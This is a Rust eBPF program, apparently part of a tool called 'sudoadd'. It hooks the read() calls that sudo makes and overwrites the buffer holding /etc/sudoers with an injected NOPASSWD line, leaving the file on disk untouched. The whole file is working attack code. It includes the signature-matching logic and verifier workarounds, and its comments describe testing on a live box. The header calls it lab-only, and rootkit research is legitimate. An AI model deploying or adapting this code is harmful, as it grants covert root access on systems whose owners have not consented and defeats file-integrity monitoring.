#![no_std]
#![no_main]
//! LAB-ONLY: forge the sudoers policy `sudo` parses. When a process named
//! "sudo" read()s the header of `/etc/sudoers`, overwrite the buffer with an
//! injected NOPASSWD line. The file on disk is never touched. Uses the
//! kernel-tainting bpf_probe_write_user.
//!
//! Targeting is content-based, which turns out to be both simpler and more
//! robust than tracking fds: we only tamper a read whose buffer *starts with
//! the sudoers file header* (a signature the loader captures at startup). That
//! matters for two reasons observed on a live box:
//!   * sudo validates the file, then lseek()s back to 0 and re-reads it for the
//!     actual parse. Both reads land at offset 0 and so both match the
//!     signature — we tamper the parse read, not just the first one.
//!   * Blindly overwriting every read() by "sudo" smashes the ELF headers the
//!     loader read()s for shared libraries, bricking sudo before it parses any
//!     policy. Library reads never match the sudoers header, so they're immune.

use aya_ebpf::{
    helpers::{
        bpf_get_current_comm, bpf_get_current_pid_tgid, bpf_probe_read_user,
        generated::bpf_probe_write_user,
    },
    macros::{map, tracepoint},
    maps::{Array, HashMap},
    programs::TracePointContext,
};
use sudoadd_common::{Payload, ReadCtx, Sig, SIG_LEN};

// pid_tgid -> the in-flight read (buf/count captured at entry).
#[map] static READS: HashMap<u64, ReadCtx> = HashMap::with_max_entries(1024, 0);
#[map] static PAYLOAD: Array<Payload> = Array::with_max_entries(1, 0);
#[map] static SIG: Array<Sig> = Array::with_max_entries(1, 0);
#[map] static TAMPERS: HashMap<u32, u64> = HashMap::with_max_entries(1, 0);

#[inline(always)]
fn bump(m: &HashMap<u32, u64>, k: u32, by: u64) {
    let n = unsafe { m.get(&k).copied().unwrap_or(0) } + by;
    let _ = m.insert(&k, &n, 0);
}

#[inline(always)]
fn comm_is(target: &[u8]) -> bool {
    let comm = bpf_get_current_comm().unwrap_or_default(); // [u8; 16]
    let mut i = 0;
    while i < target.len() && i < 15 {
        if comm[i] != target[i] {
            return false;
        }
        i += 1;
    }
    comm[target.len()] == 0 // exact match: next byte is the null terminator
}

#[tracepoint]
pub fn enter_read(ctx: TracePointContext) -> u32 {
    if !comm_is(b"sudo") {
        return 0;
    }
    // syscalls:sys_enter_read — fd(@16), char *buf(@24), size_t count(@32)
    let buf: u64 = match unsafe { ctx.read_at(24) } { Ok(v) => v, _ => return 0 };
    let count: u64 = match unsafe { ctx.read_at(32) } { Ok(v) => v, _ => return 0 };
    let _ = READS.insert(&bpf_get_current_pid_tgid(), &ReadCtx { buf, count }, 0);
    0
}

#[tracepoint]
pub fn exit_read(ctx: TracePointContext) -> u32 {
    let _ = on_exit(&ctx);
    0
}

fn on_exit(ctx: &TracePointContext) -> Result<(), ()> {
    // syscalls:sys_exit_read — ret(@16) is bytes read
    let ret: i64 = unsafe { ctx.read_at(16) }.map_err(|_| ())?;
    let key = bpf_get_current_pid_tgid();
    let rc = *unsafe { READS.get(&key) }.ok_or(())?;
    let _ = READS.remove(&key);
    if ret < SIG_LEN as i64 {
        return Ok(()); // too short to be the file header
    }

    // Is this the sudoers header? Compare the buffer's first SIG_LEN bytes to
    // the signature the loader captured from /etc/sudoers.
    let sig = SIG.get(0).ok_or(())?;
    let head = unsafe { bpf_probe_read_user::<[u8; SIG_LEN]>(rc.buf as *const [u8; SIG_LEN]) }
        .map_err(|_| ())?;
    let mut i = 0;
    while i < SIG_LEN {
        if head[i] != sig.bytes[i] {
            return Ok(()); // not the sudoers header — leave it alone
        }
        i += 1;
    }

    let p = PAYLOAD.get(0).ok_or(())?;
    // Clamp to 1..=64. The *lower* bound is load-bearing on modern kernels:
    // bpf_probe_write_user's size is ARG_CONST_SIZE (not _OR_ZERO), so the
    // verifier rejects any size it can't prove is non-zero ("R3 invalid
    // zero-sized read"). p.len comes from a map, range [0, u32::MAX].
    if p.len == 0 || p.len > 64 {
        return Ok(());
    }
    let len = p.len; // verifier now knows len ∈ 1..=64
    if (ret as u64) >= len as u64 && rc.count >= len as u64 {
        unsafe {
            bpf_probe_write_user(
                rc.buf as *mut core::ffi::c_void,
                p.line.as_ptr() as *const core::ffi::c_void,
                len,
            );
        }
        bump(&TAMPERS, 0, 1);
    }
    Ok(())
}

#[cfg(not(test))]
#[panic_handler]
fn panic(_: &core::panic::PanicInfo) -> ! {
    loop {}
}
